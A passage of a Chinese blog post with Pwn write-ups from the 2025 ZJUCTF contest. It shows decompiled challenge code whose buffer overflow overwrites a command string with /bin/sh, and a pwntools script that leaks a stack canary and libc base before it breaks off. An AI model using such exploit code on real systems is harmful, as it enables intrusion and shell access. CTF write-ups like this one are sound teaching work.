<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2025 ZJUCTF Pwn方向部分题解 | 晚栀winegee~</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="引言： 2025 ZJUCTF Pwn方向题解，包含unlucky，safe，oh_arkpwn2025等10道赛题。">
<meta property="og:type" content="article">
<meta property="og:title" content="2025 ZJUCTF Pwn方向部分题解">
<meta property="og:url" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/index.html">
<meta property="og:site_name" content="晚栀winegee~">
<meta property="og:description" content="引言： 2025 ZJUCTF Pwn方向题解，包含unlucky，safe，oh_arkpwn2025等10道赛题。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125222423882.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125222902335.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125223902379.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125224239578.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125224218073.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125224932282.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125225651954.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125231135529.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125231704250.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125232701993.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125233957631.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126001455360.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126002533793.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126152107075.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126152352098.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126153530895.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126154510272.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126155707744.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126160707730.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126160927613.png">
<meta property="og:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251126170742007.png">
<meta property="article:published_time" content="2025-11-28T18:23:45.000Z">
<meta property="article:modified_time" content="2025-11-28T18:33:34.380Z">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wing3e.github.io/2025/11/29/ZJUCTF2025/image-20251125222423882.png">
  
    <link rel="alternative" href="/atom.xml" title="晚栀winegee~" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/avatar.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
							<li><a href="/tags">Tags</a></li>
				        
							<li><a href="/introduction">About me</a></li>
				        
							<li><a target="_blank" rel="noopener" href="http://www.winegee.xyz/">Winegee的书房</a></li>
				        
							<li><a href="/log">Maintenance log</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
					        
						</div>
						<!-- music -->
						
							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
							<div style="position: absolute; left: auto; width: 85%;">
								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1805347343&auto=1&height=66"></iframe>
							</div>
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BeginCTF/" style="font-size: 10px;">BeginCTF</a> <a href="/tags/CAN-IDS/" style="font-size: 10px;">CAN-IDS</a> <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/MoeCTF/" style="font-size: 10px;">MoeCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 10px;">ZJUCTF</a> <a href="/tags/eBPF/" style="font-size: 10px;">eBPF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E7%90%86%E8%AE%BA/" style="font-size: 10px;">信息理论</a> <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" style="font-size: 12px;">堆利用</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 10px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 14px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 16px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 12px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 18px;">计算机系统II</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91/" style="font-size: 10px;">车联网</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjuccnocc.github.io/Home">CCnocc</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好标题</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjulwind.github.io/home/">ZY老师</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">aaa</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
					<li><a href="/tags">Tags</a></li>
		        
					<li><a href="/introduction">About me</a></li>
		        
					<li><a target="_blank" rel="noopener" href="http://www.winegee.xyz/">Winegee的书房</a></li>
		        
					<li><a href="/log">Maintenance log</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-ZJUCTF2025" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/11/29/ZJUCTF2025/" class="article-date">
  	<time datetime="2025-11-28T18:23:45.000Z" itemprop="datePublished">2025-11-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2025 ZJUCTF Pwn方向部分题解
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
	</div>

        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<h3 id="引言">引言：</h3>
<p>2025 ZJUCTF Pwn方向题解，包含unlucky，safe，oh_arkpwn2025等10道赛题。</p>
<span id="more"></span>
<blockquote>
<p>由于校巴上面上新了23年和24年校赛的pwn题目，所以本站对前两年的pwn题解进行暂时下架，本题解持续到下次校巴上新</p>
</blockquote>
<h3 id="who_am_i">1 who_am_i</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> n3; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  _DWORD buf[<span class="number">12</span>]; <span class="comment">// [esp+7h] [ebp-41h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+37h] [ebp-11h]</span></span><br><span class="line">  <span class="type">char</span> command[<span class="number">7</span>]; <span class="comment">// [esp+39h] [ebp-Fh] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(command, <span class="string">"whoami"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  n3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>);</span><br><span class="line">      <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%d"</span>, &amp;n3) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid input."</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">getchar</span>() != <span class="number">10</span> )</span><br><span class="line">        ;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">system</span>(command);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n3 == <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, buf);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>可以看到我们可以通过溢出buf到command，将command覆盖为<code>/bin/sh</code>，这样执行的时候就会执行<code>/bin/sh</code></p>
<p>打通该容器可以在该容器下面找到<code>revenge of who_am_i</code>的附件</p>
<p>在此之前一直以为<code>revenge</code>是个无附件题，在那爆破呢还.......</p>
<h3 id="revenge-of-who_am_i">2 revenge of who_am_i</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> n3; <span class="comment">// [esp+0h] [ebp-44h] BYREF</span></span><br><span class="line">  _DWORD buf[<span class="number">12</span>]; <span class="comment">// [esp+6h] [ebp-3Eh] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+36h] [ebp-Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+38h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+3Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  n3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>);</span><br><span class="line">      <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%d"</span>, &amp;n3) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid input."</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">getchar</span>() != <span class="number">10</span> )</span><br><span class="line">        ;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">system</span>(<span class="string">"whoami"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n3 == <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, buf);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>相较上一题，这一题把<code>whoami</code>改成了硬编码，但仍然存在栈溢出，这时候我们只要打一个32位的rop就行了</p>
<p>本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/5e3186a2-873f-43af-a27b-2b3692ac372f"</span>)</span><br><span class="line"><span class="comment"># p = process("./revenge.elf")</span></span><br><span class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x39</span> - <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x42</span> - <span class="number">3</span> - <span class="number">4</span> - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">canary = <span class="string">b"\x00"</span> + p.recv(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># old_ebp = p.recv(4)</span></span><br><span class="line">success(<span class="string">"canary =&gt; "</span> + <span class="built_in">hex</span>(u32(canary)))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x42</span> - <span class="number">4</span> - <span class="number">8</span>)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">arg1 = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># old_ebp = p.recv(4)</span></span><br><span class="line">success(<span class="string">"1 =&gt; "</span> + <span class="built_in">hex</span>(arg1))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x42</span> - <span class="number">7</span>)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">arg2 = u32(<span class="string">b"\x00"</span> + p.recv(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># old_ebp = p.recv(4)</span></span><br><span class="line">success(<span class="string">"2 =&gt; "</span> + <span class="built_in">hex</span>(arg2))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x42</span> - <span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">arg3 = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># old_ebp = p.recv(4)</span></span><br><span class="line">success(<span class="string">"3 =&gt; "</span> + <span class="built_in">hex</span>(arg3))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x42</span>)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">"leak =&gt; "</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base = leak - (<span class="number">0xf7ca6519</span> - <span class="number">0xf7c85000</span>)</span><br><span class="line">success(<span class="string">"libc_base =&gt; "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xdeee3</span>, <span 